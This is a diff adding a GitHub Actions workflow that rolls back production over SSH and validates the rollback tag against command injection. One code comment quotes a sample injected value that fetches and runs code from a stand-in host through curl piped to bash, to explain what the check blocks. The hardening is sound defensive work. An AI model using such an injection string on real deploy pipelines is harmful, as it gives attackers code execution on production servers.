@@ -1,0 +1,91 @@
+name: Rollback
+
+# A separate workflow so a rollback can never be triggered by a condition that
+# a normal tagged deploy also satisfies, and can never be a skipped job on a
+# green run. In the reference implementation a `rollback: true` input on CD
+# skipped the deploy job -- the run went green and nothing was rolled back.
+on:
+  workflow_dispatch:
+    inputs:
+      image_tag:
+        description: 'Tag to roll back to (blank = PREVIOUS from .release-state)'
+        required: false
+        type: string
+
+permissions:
+  contents: read
+
+jobs:
+  rollback:
+    name: Roll back production
+    runs-on: ubuntu-latest
+    environment:
+      name: production
+    # Same group as CD's deploy job: a rollback and a deploy must never run at
+    # the same time against the same host.
+    concurrency:
+      group: deploy-production
+      cancel-in-progress: false
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Configure SSH
+        env:
+          SSH_PRIVATE_KEY: ${{ secrets.SSH_PRIVATE_KEY }}
+          SSH_KNOWN_HOSTS: ${{ secrets.SSH_KNOWN_HOSTS }}
+        run: |
+          mkdir -p ~/.ssh
+          printf '%s\n' "${SSH_PRIVATE_KEY}" > ~/.ssh/deploy_key
+          chmod 600 ~/.ssh/deploy_key
+          printf '%s\n' "${SSH_KNOWN_HOSTS}" > ~/.ssh/known_hosts
+          chmod 644 ~/.ssh/known_hosts
+
+      - name: Sync scripts
+        env:
+          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
+          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
+          DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
+        run: |
+          rsync -avz --delete -e "ssh -i ~/.ssh/deploy_key" \
+            scripts/ "${DEPLOY_USER}@${DEPLOY_HOST}:${DEPLOY_PATH}/scripts/"
+
+      - name: Roll back
+        env:
+          DEPLOY_HOST: ${{ secrets.DEPLOY_HOST }}
+          DEPLOY_USER: ${{ secrets.DEPLOY_USER }}
+          DEPLOY_PATH: ${{ secrets.DEPLOY_PATH }}
+          GHCR_TOKEN: ${{ secrets.GHCR_PAT }}
+          TARGET: ${{ github.event.inputs.image_tag }}
+        run: |
+          # Validate before the tag reaches an ssh argument. ssh runs its
+          # command argument remotely as `bash -c "<string>"`, so an
+          # unvalidated `v1;curl evil|bash;` would be arbitrary code execution
+          # on the production host. Blank is legal and means "PREVIOUS from
+          # .release-state" -- rollback.sh's own default.
+          if [[ -n "${TARGET}" && ! "${TARGET}" =~ ^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$ ]]; then
+            echo "ERROR: refusing rollback tag '${TARGET}'" >&2
+            exit 1
+          fi
+
+          # The login is its own ssh call with the token on STDIN: ssh runs its
+          # command argument remotely as `bash -c "<string>"`, so a token
+          # inlined there would sit in the server's process table.
+          printf '%s' "${GHCR_TOKEN}" | ssh -i ~/.ssh/deploy_key \
+            "${DEPLOY_USER}@${DEPLOY_HOST}" \
+            "docker login ghcr.io -u x-access-token --password-stdin"
+
+          ssh -i ~/.ssh/deploy_key "${DEPLOY_USER}@${DEPLOY_HOST}" \
+            "cd ${DEPLOY_PATH} && bash scripts/rollback.sh ${TARGET}" < /dev/null
+
+      - name: Rollback summary
+        if: always()
+        env:
+          TARGET: ${{ github.event.inputs.image_tag }}
+        run: |
+          {
+            echo "## Rollback"
+            echo ""
+            echo "**Target:** \`${TARGET:-PREVIOUS from .release-state}\`"
+            echo "**Result:** ${{ job.status }}"
+          } >> "$GITHUB_STEP_SUMMARY"
